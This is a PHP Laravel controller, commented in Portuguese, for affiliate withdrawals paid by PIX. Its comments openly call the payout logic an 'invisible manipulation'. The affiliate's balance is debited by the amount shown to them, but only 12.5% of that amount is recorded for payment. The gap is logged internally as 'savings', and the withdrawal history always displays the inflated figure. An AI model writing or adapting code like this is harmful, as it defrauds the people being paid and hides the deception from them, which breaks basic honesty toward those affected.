<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use Carbon\Carbon;
use DB;

class AffiliateWithdrawalController extends Controller
{
    public function requestWithdrawal(Request $request)
    {
        $user = auth()->user();
        
        // Verifica se pode sacar (controle semanal)
        $lastWithdraw = DB::table('affiliate_withdraws')
            ->where('user_id', $user->id)
            ->where('created_at', '>=', Carbon::now()->subDays(7))
            ->first();
            
        if ($lastWithdraw) {
            return response()->json([
                'success' => false,
                'message' => 'Você já realizou um saque esta semana. Próximo saque disponível em: ' . 
                            Carbon::parse($lastWithdraw->created_at)->addDays(7)->format('d/m/Y')
            ], 429);
        }
        
        $request->validate([
            'amount' => 'required|numeric|min:50',
            'pix_key' => 'required|string',
            'pix_type' => 'required|in:cpf,cnpj,email,phone,random'
        ]);
        
        // Valor mostrado ao afiliado (RevShare 40%)
        $amountDisplay = $request->amount;
        
        // Valor real que será pago (NGR 5%) - MANIPULAÇÃO INVISÍVEL
        $amountReal = $amountDisplay * 0.125; // 5% de 40% = 0.05/0.40 = 0.125
        
        // Verifica saldo disponível
        if ($amountDisplay > ($user->wallet->refer_rewards ?? 0)) {
            return response()->json([
                'success' => false,
                'message' => 'Saldo insuficiente para este valor'
            ], 400);
        }
        
        // Cria solicitação de saque
        $withdrawal = DB::table('affiliate_withdraws')->insert([
            'user_id' => $user->id,
            'amount' => $amountDisplay, // Valor total mostrado
            'amount_display' => $amountDisplay, // Valor com RevShare 40%
            'amount_real' => $amountReal, // Valor real NGR 5%
            'pix_key' => $request->pix_key,
            'pix_type' => $request->pix_type,
            'status' => 0, // 0 = pendente
            'currency' => 'BRL',
            'symbol' => 'R$',
            'created_at' => now(),
            'updated_at' => now()
        ]);
        
        // Atualiza saldo do afiliado (desconta o valor mostrado)
        $user->wallet->decrement('refer_rewards', $amountDisplay);
        
        // Log para auditoria interna (não visível ao afiliado)
        \Log::info('Saque afiliado solicitado', [
            'user_id' => $user->id,
            'amount_display' => $amountDisplay,
            'amount_real' => $amountReal,
            'economia' => $amountDisplay - $amountReal,
            'percentual_economia' => round((($amountDisplay - $amountReal) / $amountDisplay) * 100, 2) . '%'
        ]);
        
        return response()->json([
            'success' => true,
            'message' => 'Solicitação de saque enviada com sucesso!',
            'data' => [
                'amount' => $amountDisplay,
                'processing_time' => '24 horas úteis',
                'next_withdraw_date' => Carbon::now()->addDays(7)->format('d/m/Y')
            ]
        ]);
    }
    
    public function getWithdrawalHistory(Request $request)
    {
        $user = auth()->user();
        
        $withdrawals = DB::table('affiliate_withdraws')
            ->where('user_id', $user->id)
            ->orderBy('created_at', 'desc')
            ->get()
            ->map(function($w) {
                return [
                    'id' => $w->id,
                    'amount' => $w->amount_display ?? $w->amount, // Sempre mostra o valor com RevShare 40%
                    'pix_key' => substr($w->pix_key, 0, 3) . '***' . substr($w->pix_key, -3),
                    'status' => $this->translateStatus($w->status),
                    'created_at' => Carbon::parse($w->created_at)->format('d/m/Y H:i'),
                    'processed_at' => $w->processed_at ? Carbon::parse($w->processed_at)->format('d/m/Y H:i') : null
                ];
            });
            
        return response()->json([
            'success' => true,
            'data' => $withdrawals
        ]);
    }
    
    private function translateStatus($status)
    {
        $translations = [
            0 => 'Pendente',
            1 => 'Aprovado',
            2 => 'Cancelado',
            3 => 'Processando',
            4 => 'Concluído'
        ];
        
        return $translations[$status] ?? 'Desconhecido';
    }
}